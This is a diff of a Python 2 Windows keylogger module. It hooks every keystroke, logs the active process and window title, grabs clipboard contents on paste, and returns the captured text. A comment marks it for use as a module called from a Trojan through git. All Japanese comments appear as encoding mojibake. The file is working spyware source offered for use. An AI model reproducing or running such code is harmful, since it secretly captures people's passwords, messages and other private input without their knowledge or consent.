@@ -1,1 +1,265 @@
-# -*- coding: utf-8 -*-from ctypes import *import pythoncomimport pyHook import win32clipboard# ++++ ’Ç‰Á ++++import timeimport Queueimport win32api# ++++ ’Ç‰Á ++++user32   = windll.user32kernel32 = windll.kernel32psapi    = windll.psapicurrent_window = None# ++++ ’Ç‰Á ++++kl = Nonelog = None# ++++ ’Ç‰Á ++++def get_current_process():    # ‘€ì’†‚ÌƒEƒBƒ“ƒhƒE‚Ö‚Ìƒnƒ“ƒhƒ‹‚ğæ“¾    hwnd = user32.GetForegroundWindow()    # ƒvƒƒZƒXID‚Ì“Á’è    pid = c_ulong(0)    user32.GetWindowThreadProcessId(hwnd, byref(pid))    # “Á’è‚µ‚½ƒvƒƒZƒXID‚Ì•Û‘¶    process_id = "%d" % pid.value    # Àsƒtƒ@ƒCƒ‹–¼‚Ìæ“¾    executable = create_string_buffer("\x00" * 512)    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)    # ƒEƒBƒ“ƒhƒE‚Ìƒ^ƒCƒgƒ‹ƒo[‚Ì•¶š—ñ‚ğæ“¾    window_title = create_string_buffer("\x00" * 512)    length = user32.GetWindowTextA(hwnd, byref(window_title),512)    # ƒwƒbƒ_[‚Ìo—Í    print    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)    print    # ƒnƒ“ƒhƒ‹‚ÌƒNƒ[ƒY    kernel32.CloseHandle(hwnd)    kernel32.CloseHandle(h_process)def KeyStroke(event):    global current_window    global log    # +’Ç‰Á     # ‘€ì’†‚ÌƒEƒBƒ“ƒhƒE‚ª•Ï‚í‚Á‚½‚©Šm”F    if event.WindowName != current_window:        current_window = event.WindowName        get_current_process()    # •W€“I‚ÈƒL[‚ª‰Ÿ‰º‚³‚ê‚½‚©ƒ`ƒFƒbƒN    if event.Ascii > 32 and event.Ascii < 127:        print chr(event.Ascii),        log.put(chr(event.Ascii))    # +’Ç‰Á#        if not log.empty():#            print log.queue    else:        # [Ctrl-V]‚ª‰Ÿ‰º‚³‚ê‚½‚È‚ç‚ÎAƒNƒŠƒbƒvƒ{[ƒh‚Ìƒf[ƒ^‚ğæ“¾        if event.Key == "V":            win32clipboard.OpenClipboard()            pasted_value = win32clipboard.GetClipboardData()            win32clipboard.CloseClipboard()            print "[PASTE] - %s" % (pasted_value),        else:            print "[%s]" % event.Key,            # ++++ ’Ç‰Á ++++            spkey = "[%s]" % event.Key            log.put(spkey)            if event.Ascii == 0x0d:                kl.UnhookKeyboard()                win32api.PostQuitMessage()            # ++++ ’Ç‰Á ++++    # “o˜^Ï‚İ‚ÌŸ‚ÌƒtƒbƒN‚Éˆ—‚ğ“n‚·    return True# run() ƒƒ\ƒbƒh‚©‚çŠJn‚³‚¹‚édef run(**args):    # ++++ ’Ç‰Á ++++    global kl    global log    print"[*] In Keylogger module."    log = Queue.Queue()    # ++++ ’Ç‰Á ++++    # ƒtƒbƒNƒ}ƒl[ƒWƒƒ[‚Ìì¬‚Æ“o˜^    kl         = pyHook.HookManager()    kl.KeyDown = KeyStroke    # ƒtƒbƒN‚Ì“o˜^‚ÆÀs‚ğŒp‘±    kl.HookKeyboard()    pythoncom.PumpMessages()    #print log.queue    time.sleep(120)    # ++++ ’Ç‰Á ++++    retval = ""    while not log.empty():        retval = retval + log.get()    print retval    return retval    # ++++ ’Ç‰Á ++++# ƒ[ƒJƒ‹‚ÅÀs‚³‚¹‚éê‡‚É•K—v# ƒgƒƒC‚Ì–Ø”n‚©‚ç gitŒo—R‚ÅŒÄ‚Ño‚·ê‡‚ÍAƒRƒƒ“ƒgƒAƒEƒg‚·‚é#run()
+# -*- coding: utf-8 -*-
+
+from ctypes import *
+
+import pythoncom
+
+import pyHook 
+
+import win32clipboard
+
+
+
+# ++++ è¿½åŠ  ++++
+
+import time
+
+import Queue
+
+import win32api
+
+# ++++ è¿½åŠ  ++++
+
+
+
+
+
+user32   = windll.user32
+
+kernel32 = windll.kernel32
+
+psapi    = windll.psapi
+
+current_window = None
+
+
+
+
+
+# ++++ è¿½åŠ  ++++
+
+kl = None
+
+log = None
+
+# ++++ è¿½åŠ  ++++
+
+
+
+
+
+def get_current_process():
+
+
+
+    # æ“ä½œä¸­ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¸ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’å–å¾—
+
+    hwnd = user32.GetForegroundWindow()
+
+
+
+    # ãƒ—ãƒ­ã‚»ã‚¹IDã®ç‰¹å®š
+
+    pid = c_ulong(0)
+
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
+
+
+
+    # ç‰¹å®šã—ãŸãƒ—ãƒ­ã‚»ã‚¹IDã®ä¿å­˜
+
+    process_id = "%d" % pid.value
+
+
+
+    # å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«åã®å–å¾—
+
+    executable = create_string_buffer("\x00" * 512)
+
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+
+
+
+    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
+
+
+
+    # ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®ã‚¿ã‚¤ãƒˆãƒ«ãƒãƒ¼ã®æ–‡å­—åˆ—ã‚’å–å¾—
+
+    window_title = create_string_buffer("\x00" * 512)
+
+    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
+
+
+
+    # ãƒ˜ãƒƒãƒ€ãƒ¼ã®å‡ºåŠ›
+
+    print
+
+    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+
+    print
+
+
+
+
+
+    # ãƒãƒ³ãƒ‰ãƒ«ã®ã‚¯ãƒ­ãƒ¼ã‚º
+
+    kernel32.CloseHandle(hwnd)
+
+    kernel32.CloseHandle(h_process)
+
+
+
+
+
+
+
+def KeyStroke(event):
+
+
+
+    global current_window
+
+
+
+    global log    # +è¿½åŠ  
+
+
+
+    # æ“ä½œä¸­ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒå¤‰ã‚ã£ãŸã‹ç¢ºèª
+
+    if event.WindowName != current_window:
+
+        current_window = event.WindowName
+
+        get_current_process()
+
+
+
+    # æ¨™æº–çš„ãªã‚­ãƒ¼ãŒæŠ¼ä¸‹ã•ã‚ŒãŸã‹ãƒã‚§ãƒƒã‚¯
+
+    if event.Ascii > 32 and event.Ascii < 127:
+
+        print chr(event.Ascii),
+
+        log.put(chr(event.Ascii))    # +è¿½åŠ 
+
+#        if not log.empty():
+
+#            print log.queue
+
+    else:
+
+        # [Ctrl-V]ãŒæŠ¼ä¸‹ã•ã‚ŒãŸãªã‚‰ã°ã€ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—
+
+        if event.Key == "V":
+
+            win32clipboard.OpenClipboard()
+
+            pasted_value = win32clipboard.GetClipboardData()
+
+            win32clipboard.CloseClipboard()
+
+            print "[PASTE] - %s" % (pasted_value),
+
+        else:
+
+            print "[%s]" % event.Key,
+
+            # ++++ è¿½åŠ  ++++
+
+            spkey = "[%s]" % event.Key
+
+            log.put(spkey)
+
+            if event.Ascii == 0x0d:
+
+                kl.UnhookKeyboard()
+
+                win32api.PostQuitMessage()
+
+            # ++++ è¿½åŠ  ++++
+
+
+
+    # ç™»éŒ²æ¸ˆã¿ã®æ¬¡ã®ãƒ•ãƒƒã‚¯ã«å‡¦ç†ã‚’æ¸¡ã™
+
+    return True
+
+
+
+
+
+# run() ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰é–‹å§‹ã•ã›ã‚‹
+
+def run(**args):
+
+
+
+    # ++++ è¿½åŠ  ++++
+
+    global kl
+
+    global log
+
+
+
+    print"[*] In Keylogger module."
+
+
+
+    log = Queue.Queue()
+
+    # ++++ è¿½åŠ  ++++
+
+
+
+
+
+    # ãƒ•ãƒƒã‚¯ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã®ä½œæˆã¨ç™»éŒ²
+
+    kl         = pyHook.HookManager()
+
+    kl.KeyDown = KeyStroke
+
+
+
+    # ãƒ•ãƒƒã‚¯ã®ç™»éŒ²ã¨å®Ÿè¡Œã‚’ç¶™ç¶š
+
+    kl.HookKeyboard()
+
+    pythoncom.PumpMessages()
+
+
+    #print log.queue
+
+    time.sleep(120)
+
+    # ++++ è¿½åŠ  ++++
+
+    retval = ""
+
+    while not log.empty():
+
+        retval = retval + log.get()
+
+
+
+    print retval
+
+    return retval
+
+    # ++++ è¿½åŠ  ++++
+
+
+
+
+
+# ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã•ã›ã‚‹å ´åˆã«å¿…è¦
+
+# ãƒˆãƒ­ã‚¤ã®æœ¨é¦¬ã‹ã‚‰ gitçµŒç”±ã§å‘¼ã³å‡ºã™å ´åˆã¯ã€ã‚³ãƒ¡ãƒ³ãƒˆã‚¢ã‚¦ãƒˆã™ã‚‹
+
+#run()
+
